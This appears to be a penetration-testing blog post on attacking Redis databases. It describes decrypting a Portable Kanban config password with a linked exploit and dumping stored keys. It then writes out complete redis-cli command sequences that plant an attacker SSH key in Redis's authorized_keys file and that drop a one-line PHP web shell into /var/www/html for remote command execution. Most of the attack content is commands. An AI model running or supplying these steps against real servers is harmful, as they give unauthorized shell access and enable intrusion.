[back](/)

### Working with Redis DB

Very often I come across the database Redis. Recently, it has become especially popular, the advantage of this database is associated with the speed of its work, as well as a simple implementation.

Access to the Redis database is carried out using a password, and there is also no distinction with users or groups. The base is not a relational, the structure is as follows: "Key" - "Value". The default "Redis Key-Value Store" service uses port 6379/TCP. 

Consider several interesting cases associated with the Redis database.

Case 1:

«Portable Kanban» is a planning management application, uses Redis database. To access the database, a password is required, which can be obtained in encrypted form from the PortableKanban.cfg file. Taking the basis of [exploit](https://www.exploit-db.com/exploits/49409) decrypt the password:

![Image](/img/redis/1.png)

Having received an cleartext password to connect to the Redis database, u can use the redis-cli utility.

![Image](/img/redis/2.png)

Using «KEYS \*» and «GET key» commands, you can get the key values stored in the Redis database. Than decrypt the Administrator user password and check its validity.

![Image](/img/redis/3.png)

Done

Case 2:

Imagine the situation when you need to get RCE on Linux server, using the Redis database. At the same time, you have a password for the database, or you can go to the base anonymously. In this case, you can try to record the public key to the authorized_keys file along the path /var/lib/redis/.ssh/

```
ssh-keygen -t rsa -C "root@myhost"
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > temp.txt 
cat temp.txt | redis-cli -h «IP_redis_db» -x set value_before_pub_key

redis-cli -h «IP_redis_db»
CONFIG get dir 
config set dir /var/lib/redis/.ssh
config set dbfilename authorized_keys 
config get dbfilename
save
```

The meaning of this manipulation is to redirect the output of the contents of the open key file + several empty lines. Empty strings are needed to in the authorized_keys file, your key appears from a new line without unnecessary characters. As a result, the authorized_keys file will look like this:

```
REDIS0008       redis-ver4.0.9
redis-bits@ctime¡used-mem

                         aof-preamblevalue_before_pub_keyB9


ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2LJ+jzG2kLfgloez6wWG721ecDBuhes7qRPDc5sJEqioNmEVzd9Mer8kxHgchMHI/IoaEWh7bsFwn2/5Jssobztlk04cGjhQAJwN2iuztPOb/6vVgaGxSiELKA31KH+GZlNZnIvzFAyl+ObQvLowDNnT0qto1TUMtJc59wGBEJfyxjOXbdN7mYLM831zkLeSEoNBtitTU/MuRdfHz5xxa4vzgjn1IGpNJFbnUZliDoiZVcucjfQRLWe/ysg/lM40JAEpEmRr+YE2GbiOAGJ1FIujX8l0Pnsptfmy1VQix+I8s22ifUM/c9DoKV2XkfGJ+ywsgM1QTmFNXKNgWU/0+qwx+oZHRxZ6Fh2Y/M02BLSk1+4IkKwDnQOPY0338bjuaUbS7+Scl2I2hdFZ95qbLXIVqbJES8lQ2PDKA2ADYILuQHLAohLRS/R2yc22DGZANwrlbxl236nRiJcSVYdZEeUEnUfNCEFbolyH0zoVx4LMcUsGoyx9gWLJ1gXWHGuM= root@yourhost
```

Than run ssh -v -i ./id_rsa redis@IP_redis_db for connecting to the server

Case 3:

If you have write permission to the /var/www/html/ directory, than you can try to write web shell on the server with Linux, using the Redis database:

```
redis-cli -h «IP_redis_db» 
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename sh.php
SET PAYLOAD '<?=`$_GET[1]`?>'
BGSAVE
```

Than use a web interface to access sh.php file: http://web/sh.php?1=id


<div id="disqus_thread"></div>
<script>
(function() { // DON'T EDIT BELOW THIS LINE
var d = document, s = d.createElement('script');
s.src = 'https://hackitfaster-hopto-org.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

[back](/)